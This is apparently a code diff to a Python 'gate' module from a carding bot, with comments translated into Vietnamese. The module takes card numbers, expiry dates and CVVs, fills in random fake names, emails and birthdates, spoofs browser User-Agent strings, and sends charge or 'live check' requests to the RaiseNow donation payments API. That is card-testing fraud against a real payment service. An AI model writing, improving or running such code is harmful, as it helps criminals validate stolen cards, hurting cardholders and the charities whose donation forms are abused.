@@ -5,46 +5,46 @@ import random
 import string
 import time
 
-# --- UTILITY FUNCTIONS (Copied from main bot file for self-containment) ---
+# Lấy logger để ghi lại thông tin
 logger = logging.getLogger(__name__)
 
+# --- CÁC HÀM TIỆN ÍCH ĐƯỢC SAO CHÉP TỪ MAIN ---
+# Các hàm này cần thiết cho hoạt động của gate nhưng để tránh lỗi import vòng tròn,
+# chúng được sao chép trực tiếp vào đây.
+
 def generate_random_string(length=8):
-    """Generates a random string of characters."""
+    """Tạo một chuỗi ký tự ngẫu nhiên."""
     letters = string.ascii_lowercase
     return ''.join(random.choice(letters) for _ in range(length))
 
 def random_email():
-    """Generates a random email address."""
+    """Tạo một địa chỉ email ngẫu nhiên."""
     prefix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(8, 15)))
     domain = ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 10)))
     return f"{prefix}@{domain}.com"
 
 def random_birth_day():
-    """Generates a random day for birthday (1-28)."""
+    """Tạo ngày sinh ngẫu nhiên (1-28)."""
     return str(random.randint(1, 28)).zfill(2)
 
 def random_birth_month():
-    """Generates a random month for birthday (1-12)."""
+    """Tạo tháng sinh ngẫu nhiên (1-12)."""
     return str(random.randint(1, 12)).zfill(2)
 
 def random_birth_year():
-    """Generates a random year for birthday (1970-2005)."""
+    """Tạo năm sinh ngẫu nhiên (1970-2005)."""
     return str(random.randint(1970, 2005))
 
 def random_user_agent():
-    """Generates a random realistic User-Agent string."""
+    """Tạo một chuỗi User-Agent thực tế ngẫu nhiên."""
     chrome_major = random.randint(100, 125)
     chrome_build = random.randint(0, 6500)
     chrome_patch = random.randint(0, 250)
-    win_major = random.randint(10, 11)
-    win_minor = random.randint(0, 3)
-    win_build = random.randint(10000, 22631)
-    win_patch = random.randint(0, 500)
     webkit_major = random.randint(537, 605)
     webkit_minor = random.randint(36, 99)
     safari_version = f"{webkit_major}.{webkit_minor}"
     chrome_version = f"{chrome_major}.0.{chrome_build}.{chrome_patch}"
-    win_version = f"{win_major}.{win_minor}; Win64; x64"
+    win_version = f"10.0; Win64; x64"
     return (
         f"Mozilla/5.0 (Windows NT {win_version}) "
         f"AppleWebKit/{safari_version} (KHTML, like Gecko) "
@@ -70,14 +70,15 @@ def make_request_with_retry(session, method, url, max_retries=5, cancellation_ev
     logger.error(final_error_message)
     return None, final_error_message
 
-# --- MAIN GATE CHECKER FUNCTION ---
-def check_card_gate1(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_gate_mode_func, get_charge_value_func, custom_charge_amount=None):
+# --- LOGIC CHÍNH CỦA GATE 1 ---
+
+def check_card_gate1(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_gate1_mode_func, get_charge_value_func, custom_charge_amount=None):
     """Logic for Gate 1 - Charge or Live Check Mode"""
-    gate1_mode = get_gate_mode_func()
+    gate1_mode = get_gate1_mode_func()
     try:
         user_agent = random_user_agent()
         
-        # Random personal info
+        # Thông tin cá nhân ngẫu nhiên
         first_name = generate_random_string(random.randint(12, 20))
         last_name = generate_random_string(random.randint(10, 20))
         cardholder = f"{first_name} {last_name}"
@@ -174,9 +175,7 @@ def check_card_gate1(session, line, cc, mes, ano, cvv, bin_info, cancellation_ev
             payment_url = "https://api.raisenow.io/payments" # Charge endpoint
             payment_payload = base_payload.copy()
             payment_payload["amount"] = {"currency": "EUR", "value": charge_value}
-            # Remove subscription part for charge mode
-            payment_payload.pop("subscription", None)
-
+            
             payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
             if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Payment Error: {error}", bin_info
             if not payment_response: return 'error', line, "HTTP Error with no response during Payment", bin_info
